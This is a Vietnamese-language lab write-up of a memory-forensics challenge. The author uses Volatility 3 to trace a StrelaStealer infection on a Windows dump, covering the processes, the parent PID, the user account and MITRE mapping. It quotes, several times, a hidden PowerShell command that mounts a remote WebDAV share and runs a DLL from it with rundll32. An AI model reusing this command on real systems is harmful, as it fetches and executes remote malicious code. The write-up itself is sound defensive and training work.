---
title: '[Level-4]-Reveal'
date: 2026-03-22

---

# Lab Report - Reveal
**DatHN5 - SO3 - FSAS**
---

Reconstruct a multi-stage attack by analyzing Windows memory dumps using Volatility 3, identifying malicious processes, command lines, and correlating findings with threat intelligence. 

**Category**: Endpoint Forensics 
**Tactics**: Defense Evasion, Discovery 
**Tool**: Volatility 3

#### Scenario
You are a forensic investigator at a financial institution, and your SIEM flagged unusual activity on a workstation with access to sensitive financial data. Suspecting a breach, you received a memory dump from the compromised machine. Your task is to analyze the memory for signs of compromise, trace the anomaly's origin, and assess its scope to contain the incident effectively.

### Write up

#### Q1 Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?

Mình có xem qua info của file dump thì biết rằng đây là dump từ Windows.

![image](https://hackmd.io/_uploads/B19qaU0tbe.png)

![image](https://hackmd.io/_uploads/BkVEALRtWl.png)

Để tìm tiến trình độc hại đang chạy mình chạy tool với plugin `pslist`, `pslist`, `cmdline` để xem những tiến trình có tên lạ, đường dẫn lạ hoặc là gọi ra nhiều tiến trình không cần thiết.

Kết quả mình thấy `powershell` đang chạy một lệnh khá lạ gọi ra thêm hai tiến trình con

![image](https://hackmd.io/_uploads/B1pvHPAtbl.png)

![image](https://hackmd.io/_uploads/ByeKBwCKWl.png)

```!
powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
```

- Bóc tách câu lệnh mình thấy rằng:
    - `-windowstyle hidden` dùng để chạy powershell ở background khiến cho user không biết rằng powershell đang chạy
    - `net use \\45.9.74.32@8888\davwwwroot\` Kết nối máy tính của nạn nhân với máy chủ độc hại từ xa (IP 45.9.74.32) bằng giao thức WebDAV để truy cập các tệp từ xa như thể chúng nằm trên máy của chính nạn nhân

        - ![image](https://hackmd.io/_uploads/SyObzffsZl.png)

    - `rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry` dùng để thực thi file `3435.dll` đây khả năng cao là file mã độc của attacker

- Mapping sang MITRE mình có được cách technique như sau:
    - [T1059.001](https://attack.mitre.org/techniques/T1059/001/) Command and Scripting Interpreter: PowerShell
    - [T1218.011](https://attack.mitre.org/techniques/T1218/011/) System Binary Proxy Execution: Rundll32
    - [T1564.003](https://attack.mitre.org/techniques/T1564/003/) Hide Artifacts: Hidden Window
    - [T1021.002](https://attack.mitre.org/techniques/T1021/002/) Remote Services: SMB/Windows Admin Shares
    - [T1105](https://attack.mitre.org/techniques/T1105/) Ingress Tool Transfer

> Flag: powershell.exe

#### Q2 Knowing the parent process ID (PPID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?

Chạy tool với plugin `pstree` mình biết được PID của powershell là **3692** còn PPID là **4120**

![image](https://hackmd.io/_uploads/HyXvKvCtWg.png)

>Flag: 4120

#### Q3 Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload?

![Screenshot 2026-03-11 104454](https://hackmd.io/_uploads/B1vXcDCt-g.png)

Như đã phân tích ở câu 1 thì tên file mà malware dùng thực thi cho giai đoạn hai đó là `3435.dll`

>Flag: 3435.dll

#### Q4 Identifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server?

Payload: 
```!
powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
```

Từ payload mà attacker thực thi mình thấy rằng hắn đang truy cập vào network share của IP `45.9.74.32` port `8888` và thư mục `davwwwroot`. Ở đây hacker đã dùng `davwwwroot` để biến ổ đĩa thành 1 loại webserver để có thể truy cập và thực hiện tải mã độc. [Link](https://www.webdavsystem.com/server/access/windows/#:~:text=see%20this%20article.-,Specifying%20WebDAV%20Server%20Url%20in%20Windows%20Explorer%20Address%20Bar,%5C%5Cwebdavserver.com%5Csales%5C)


>Flag: davwwwroot

#### Q5 What is the MITRE ATT&CK sub-technique ID that describes the execution of a second-stage payload using a Windows utility to run the malicious file?

Như đã phân tích ở câu 1, thì cái kỹ thuật mà attacker dùng để chạy file mã độc với chức năng của Windows đó là T1218.001 - System Binary Proxy Execution: Rundll32

>Flag: T1218.011

#### Q6 Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?

Để tìm được tài khoản nào đã thực hiện hành vi thực thi mã độc mình cần truy ngược lại với PID của powershell để xem ai đã chạy command tại đó.

Mình biết rằng PID của powershell là **3692**, qua tra cứu thì mình biết được tool `volatility` có chức năng trace owner của process dựa vào PID qua plugin `getsids`

![image](https://hackmd.io/_uploads/Bkij0D0tbx.png)

`vol -f ~/Desktop/192-Reveal/temp_extract_dir/192-Reveal.dmp windows.getsids --pid 3692`

![image](https://hackmd.io/_uploads/ryy3otRKWg.png)

Sau khi chạy tool mình thu được kết quả là account có tên "Elon" đã khởi chạy powershell và thực thi command độc hại để tải malware.

>Flag: Elon

#### Q7 Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?

Payload: 
```!
powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
```

Từ payload mà attacker dùng trong powershell mình biết rằng attacker đang cố kết nối tới IP 45.9.74.32 qua chướng trình net.exe của Windows

![image](https://hackmd.io/_uploads/HykfRtCFWl.png)

Vậy nên mình tra IP đó trên VirusTotal để xem thông tin về nó thi biết được đây là malware `Strela Stealer`

![image](https://hackmd.io/_uploads/SJCxWq0tWx.png)

![image](https://hackmd.io/_uploads/B1WWWq0F-e.png)

[VirusTotal](https://www.virustotal.com/graph/gfb875601f134442c913400b1c4d64ae2089df4bd9acc42c08640e8d0015b94a0)

[MalwareBazaar](https://bazaar.abuse.ch/sample/f5c54fce6c9e2f84b084bbf9968c9a76d9cd74a11ccf4fcba29dbe2e4574e3d7/)

>Flag: StrelaStealer
